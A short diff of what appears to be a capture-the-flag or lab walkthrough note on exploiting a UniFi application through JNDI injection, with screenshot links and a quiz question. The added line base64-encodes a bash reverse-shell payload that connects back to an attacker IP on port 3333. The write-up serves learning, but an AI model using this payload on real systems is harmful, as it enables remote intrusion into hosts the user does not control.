@@ -57,6 +57,7 @@ I get an error
 ![](../../Img/Pasted%20image%2020250424160606.png)
 but also a connection
 ![](../../Img/Pasted%20image%2020250424160627.png)
+With this command we can encrypt the payload for the jndi echo 'bash -c bash -i >&/dev/tcp/{ip}/3333 0>&1' | base64
 
 
 Q9: What is the default database name for UniFi applications?
